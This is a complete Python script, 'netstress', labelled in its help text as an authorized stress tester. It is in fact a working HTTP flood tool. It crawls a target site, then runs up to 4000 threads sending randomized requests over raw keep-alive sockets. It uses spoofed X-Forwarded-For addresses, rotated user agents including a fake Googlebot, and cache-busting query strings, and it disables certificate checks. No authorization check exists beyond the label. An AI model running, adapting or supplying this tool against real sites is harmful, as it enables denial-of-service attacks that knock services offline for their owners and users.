import argparse
import random
import socket
import ssl
import string
import sys
import threading
import time
from dataclasses import dataclass, field
from queue import Queue, Empty
from typing import List, Optional, Tuple
from urllib.parse import urlparse

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    print("Missing deps. Run: pip install requests beautifulsoup4")
    sys.exit(1)

# user agent
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "curl/8.4.0",
]
METHODS = ["GET", "POST", "HEAD", "OPTIONS", "PUT"]
DEFAULT_PATHS = ["/", "/index.html", "/index.php", "/api", "/login", "/search"]

# Helper
def rand_string(n: int = 12) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))
def rand_ip() -> str:
    return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

# Recon
@dataclass
class ReconResult:
    paths: List[str] = field(default_factory=list)
    postable: List[str] = field(default_factory=list)
def recon(base_url: str, timeout: float = 5.0) -> ReconResult:
    result = ReconResult()
    discovered = set()
    try:
        res = requests.get(base_url, timeout=timeout,
                           headers={"User-Agent": random.choice(USER_AGENTS)})
        soup = BeautifulSoup(res.text, "html.parser")
        for tag in soup.find_all(["a", "link", "script", "img"]):
            href = tag.get("href") or tag.get("src")
            if not href:
                continue
            if href.startswith("/") and len(href) < 200 and "?" not in href:
                discovered.add(href)
    except Exception as e:
        print(f"Recon failed: {e}")


    for path in list(discovered)[:30]:
        try:
            r = requests.head(base_url + path, timeout=3, allow_redirects=False)
            if r.status_code in (200, 204, 301, 302, 403):
                result.paths.append(path)
                if any(k in path.lower() for k in ("login", "submit", "api", "form", "contact", "search")):
                    result.postable.append(path)
        except Exception:
            continue
    if not result.paths:
        result.paths = DEFAULT_PATHS.copy()
        result.postable = ["/login", "/api"]
    print(f"Discovered {len(result.paths)} valid paths "
          f"({len(result.postable)} postable)")
    return result

# cached per method
class RequestFactory:
    def __init__(self, host: str, recon_result: ReconResult):
        self.host = host
        self.paths = recon_result.paths
        self.postable = recon_result.postable or recon_result.paths
        self._cache = {}
        self._lock = threading.Lock()
    def build(self, method: str, secure: bool) -> bytes:
        path = random.choice(self.postable if method == "POST" else self.paths)
        suffix = f"?r={rand_string(6)}" if method in ("GET", "HEAD") else ""
        key = (method, path, secure, suffix)
        with self._lock:
            if key in self._cache:
                return self._cache[key]
            ua = random.choice(USER_AGENTS)
            body = '{"k":"' + rand_string(16) + '"}' if method == "POST" else ""
            lines = [
                f"{method} {path}{suffix} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {ua}",
                f"X-Forwarded-For: {rand_ip()}",
                "Accept: */*",
                "Accept-Encoding: gzip, deflate",
                "Connection: keep-alive",
            ]
            if method == "POST":
                lines += [
                    "Content-Type: application/json",
                    f"Content-Length: {len(body)}",
                ]
            lines.append("")
            lines.append(body)
            payload = "\r\n".join(lines).encode()
            if len(self._cache) < 512:
                self._cache[key] = payload
            return payload

# lock protected
class Stats:
    def __init__(self):
        self._lock = threading.Lock()
        self.start = time.time()
        self.total = 0
        self.success = 0
        self.failed = 0
        self.bytes_sent = 0
        self.peak_rps = 0.0
        self.per_method = {}
    def record(self, method: str, ok: bool, nbytes: int):
        with self._lock:
            self.total += 1
            if ok:
                self.success += 1
            else:
                self.failed += 1
            self.bytes_sent += nbytes
            entry = self.per_method.setdefault(method, {"ok": 0, "fail": 0})
            entry["ok" if ok else "fail"] += 1
            elapsed = time.time() - self.start
            if elapsed > 0:
                rps = self.total / elapsed
                if rps > self.peak_rps:
                    self.peak_rps = rps

    def snapshot(self):
        with self._lock:
            elapsed = max(time.time() - self.start, 0.001)
            return {
                "elapsed": elapsed,
                "total": self.total,
                "success": self.success,
                "failed": self.failed,
                "rps": self.total / elapsed,
                "peak_rps": self.peak_rps,
                "mb": self.bytes_sent / (1024 * 1024),
                "per_method": dict(self.per_method),
            }

# Raw socket
class Worker(threading.Thread):
    def __init__(self, host: str, port: int, secure: bool, factory: RequestFactory,
                 stats: Stats, stop_event: threading.Event, delay_range: Tuple[float, float]):
        super().__init__(daemon=True)
        self.host = host
        self.port = port
        self.secure = secure
        self.factory = factory
        self.stats = stats
        self.stop = stop_event
        self.delay_min, self.delay_max = delay_range
        # keep-alive socket
        self._sock: Optional[socket.socket] = None
        self._ssl_ctx: Optional[ssl.SSLContext] = None
        if secure:
            self._ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            self._ssl_ctx.check_hostname = False
            self._ssl_ctx.verify_mode = ssl.CERT_NONE

    # socket lifecycle
    def _connect(self) -> bool:
        try:
            raw = socket.create_connection((self.host, self.port), timeout=3.0)
            raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            if self.secure:
                raw = self._ssl_ctx.wrap_socket(raw, server_hostname=self.host)
            raw.settimeout(2.0)
            self._sock = raw
            return True
        except Exception:
            self._sock = None
            return False
    def _close(self):
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
            self._sock = None

    # main loop
    def run(self):
        method_pool = ["GET", "HEAD", "OPTIONS", "POST"]
        while not self.stop.is_set():
            if self._sock is None and not self._connect():
                time.sleep(0.1)
                continue
            method = random.choice(method_pool)
            try:
                payload = self.factory.build(method, self.secure)
                self._sock.sendall(payload)
                self.stats.record(method, True, len(payload))
            except Exception:
                self.stats.record(method, False, 0)
                self._close()
                continue
            # small adaptive delay
            time.sleep(random.uniform(self.delay_min, self.delay_max))
            # periodic socket refresh
            if random.random() < 0.02:
                self._close()
# Orchestrator
class Stresser:
    def __init__(self, target: str, threads: int, duration: int,
                 delay_range: Tuple[float, float]):
        parsed = urlparse(target if "://" in target else f"http://{target}")
        self.host = parsed.hostname or target
        self.secure = parsed.scheme == "https"
        self.port = parsed.port or (443 if self.secure else 80)
        self.base_url = f"{parsed.scheme or 'http'}://{self.host}" + (
            f":{self.port}" if parsed.port else ""
        )
        self.threads = threads
        self.duration = duration
        self.delay_range = delay_range
        self.stats = Stats()
        self.stop = threading.Event()
        self.workers: List[Worker] = []

    def run(self):
        print(f"Target: {self.host}:{self.port} ({'https' if self.secure else 'http'})")
        print(f"Threads: {self.threads}  |  Duration: "
              f"{'unlimited' if self.duration == 0 else str(self.duration) + 's'}")
        print("Press Ctrl+C to stop\n")
        recon_result = recon(self.base_url)
        factory = RequestFactory(self.host, recon_result)

        # even split
        for i in range(self.threads):
            port = self.port
            secure = self.secure
            # sprinkle
            if i % 10 == 0:
                port = random.choice([8080, 8443, 8000, 8888])
            w = Worker(self.host, port, secure, factory, self.stats, self.stop,
                       self.delay_range)
            w.start()
            self.workers.append(w)
            time.sleep(0.001)  # micro-stagger

        start = time.time()
        last_report = start
        try:
            while not self.stop.is_set():
                time.sleep(1)
                if self.duration and (time.time() - start) >= self.duration:
                    print("\nDuration reached, shutting down")
                    self.stop.set()
                    break
                if time.time() - last_report >= 5:
                    self._report()
                    last_report = time.time()
        except KeyboardInterrupt:
            print("\nInterrupted, shutting down")
            self.stop.set()
        finally:
            for w in self.workers:
                w.join(timeout=2)
            self._final_report()

    def _report(self):
        s = self.stats.snapshot()
        print(f"[stats] {s['elapsed']:6.1f}s | "
              f"total={s['total']:>10,} ok={s['success']:>9,} "
              f"fail={s['failed']:>8,} | rps={s['rps']:>7.1f} "
              f"peak={s['peak_rps']:>7.1f} | sent={s['mb']:.2f}MB")
    def _final_report(self):
        s = self.stats.snapshot()
        print("final")
        print(f"duration   : {s['elapsed']:.1f}s")
        print(f"requests   : {s['total']:,}")
        print(f"success    : {s['success']:,}")
        print(f"failed     : {s['failed']:,}")
        print(f"avg rps    : {s['rps']:.1f}")
        print(f"peak rps   : {s['peak_rps']:.1f}")
        print(f"data sent  : {s['mb']:.2f} MB")
        if s["per_method"]:
            print("\nper-method:")
            for m, v in sorted(s["per_method"].items()):
                print(f"  {m:8s} ok={v['ok']:>8,}  fail={v['fail']:>8,}")

# CLI
def parse_args():
    p = argparse.ArgumentParser(
        description="netstress — authorized stress testing tool",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("target", help="Target URL or host (e.g. example.com or https://example.com)")
    p.add_argument("-t", "--threads", type=int, default=400,
                   help="Concurrent workers")
    p.add_argument("-d", "--duration", type=int, default=60,
                   help="Duration in seconds (0 = unlimited)")
    p.add_argument("--delay-min", type=float, default=0.001,
                   help="Minimum per-request delay (s)")
    p.add_argument("--delay-max", type=float, default=0.02,
                   help="Maximum per-request delay (s)")
    return p.parse_args()


def main():
    args = parse_args()
    if args.threads < 1 or args.threads > 4000:
        print("[!] threads must be 1-4000")
        sys.exit(1)
    if args.delay_min > args.delay_max:
        print("[!] delay-min must be <= delay-max")
        sys.exit(1)

    Stresser(
        target=args.target,
        threads=args.threads,
        duration=args.duration,
        delay_range=(args.delay_min, args.delay_max),
    ).run()

if __name__ == "__main__":
    main()